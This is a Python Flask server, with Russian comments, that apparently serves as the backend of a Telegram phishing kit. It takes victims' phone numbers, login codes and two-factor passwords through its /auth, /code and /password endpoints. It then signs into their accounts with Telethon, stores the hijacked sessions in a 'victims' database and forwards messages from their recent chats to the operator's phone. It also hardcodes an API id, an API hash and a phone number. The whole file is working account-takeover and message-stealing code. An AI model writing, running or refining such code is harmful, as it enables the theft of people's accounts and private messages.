from flask import Flask, request, jsonify
import asyncio
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
import sqlite3
import os
import logging
from flask_cors import CORS
import time

app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)

# Твои учетные данные
api_id = 25015433
api_hash = '546b7eb3f2865939ca71dbaedb49017d'
YOUR_PHONE = '+998997220530'

# База данных
def init_db():
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS accounts
                 (phone TEXT PRIMARY KEY, session_file TEXT, ref_id TEXT, 
                  status TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

async def create_telegram_session(phone, code, password, ref_id):
    session_file = f"sessions/{phone}.session"
    client = None
    try:
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        logging.info(f"🔐 Attempting login for: {phone}")
        
        if not await client.is_user_authorized():
            # Отправляем код если его нет
            if not code:
                await client.send_code_request(phone)
                logging.info(f"📞 Code sent to: {phone}")
                return {'status': 'code_sent'}
            
            # Пытаемся войти с кодом
            try:
                await client.sign_in(phone, code)
                logging.info(f"✅ Successfully signed in with code: {phone}")
            except SessionPasswordNeededError:
                logging.info(f"🔑 2FA required for: {phone}")
                return {'status': 'password_required'}
            except PhoneCodeInvalidError:
                logging.error(f"❌ Invalid code for: {phone}")
                return {'status': 'invalid_code'}
        
        # Если авторизованы - сохраняем сессию
        if await client.is_user_authorized():
            conn = sqlite3.connect('victims.db')
            c = conn.cursor()
            c.execute("INSERT OR REPLACE INTO accounts (phone, session_file, ref_id, status) VALUES (?, ?, ?, ?)", 
                     (phone, session_file, ref_id, 'active'))
            conn.commit()
            conn.close()
            
            logging.info(f"🎯 SUCCESS - Session saved for: {phone}")
            
            # Запускаем сбор данных
            await start_data_collection(client, phone)
            
            return {'status': 'success'}
            
    except SessionPasswordNeededError:
        if password:
            try:
                await client.sign_in(password=password)
                if await client.is_user_authorized():
                    conn = sqlite3.connect('victims.db')
                    c = conn.cursor()
                    c.execute("INSERT OR REPLACE INTO accounts (phone, session_file, ref_id, status) VALUES (?, ?, ?, ?)", 
                             (phone, session_file, ref_id, 'active'))
                    conn.commit()
                    conn.close()
                    
                    logging.info(f"✅ SUCCESS with 2FA: {phone}")
                    await start_data_collection(client, phone)
                    return {'status': 'success'}
            except Exception as e:
                logging.error(f"❌ 2FA failed for {phone}: {e}")
                return {'status': 'invalid_password'}
    except Exception as e:
        logging.error(f"❌ Error for {phone}: {e}")
        return {'status': 'error', 'message': str(e)}
    finally:
        if client:
            await client.disconnect()
    
    return {'status': 'error'}

async def start_data_collection(client, phone):
    """Начинаем сбор данных с аккаунта"""
    try:
        # Получаем информацию о пользователе
        me = await client.get_me()
        logging.info(f"📊 Collecting data from: {me.first_name} ({phone})")
        
        # Пересылаем последние сообщения
        async for dialog in client.iter_dialogs(limit=10):
            try:
                async for message in client.iter_messages(dialog.id, limit=5):
                    if message.text:
                        # Пересылаем важные сообщения
                        await client.forward_messages(YOUR_PHONE, message)
                        break
            except:
                continue
                
        logging.info(f"✅ Data collection completed for: {phone}")
        
    except Exception as e:
        logging.error(f"❌ Data collection failed for {phone}: {e}")

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

@app.route('/')
def home():
    return jsonify({
        'message': '✅ Telegram Auth Server is RUNNING!', 
        'status': 'active',
        'endpoints': ['/auth', '/code', '/password', '/stats']
    })

@app.route('/auth', methods=['POST'])
def auth():
    try:
        data = request.get_json()
        phone = data.get('phone')
        ref_id = data.get('ref_id')
        
        logging.info(f"🔐 Auth request for: {phone}")
        
        # Запускаем процесс авторизации
        result = run_async(create_telegram_session(phone, None, None, ref_id))
        
        return jsonify(result)
        
    except Exception as e:
        logging.error(f"❌ Auth error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/code', methods=['POST'])
def verify_code():
    try:
        data = request.get_json()
        phone = data.get('phone')
        code = data.get('code')
        ref_id = data.get('ref_id')
        
        logging.info(f"📱 Code verification for: {phone}")
        
        result = run_async(create_telegram_session(phone, code, None, ref_id))
        return jsonify(result)
        
    except Exception as e:
        logging.error(f"❌ Code error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/password', methods=['POST'])
def verify_password():
    try:
        data = request.get_json()
        phone = data.get('phone')
        password = data.get('password')
        ref_id = data.get('ref_id')
        
        logging.info(f"🔑 Password verification for: {phone}")
        
        result = run_async(create_telegram_session(phone, None, password, ref_id))
        return jsonify(result)
        
    except Exception as e:
        logging.error(f"❌ Password error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/stats', methods=['GET'])
def get_stats():
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM accounts WHERE status='active'")
    active = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM accounts")
    total = c.fetchone()[0]
    conn.close()
    
    return jsonify({
        'active_sessions': active,
        'total_accounts': total,
        'server_status': 'running'
    })

if __name__ == '__main__':
    if not os.path.exists('sessions'):
        os.makedirs('sessions')
    
    logging.info("🚀 Starting Telegram Auth Server...")
    app.run(host='0.0.0.0', port=5000, debug=False)
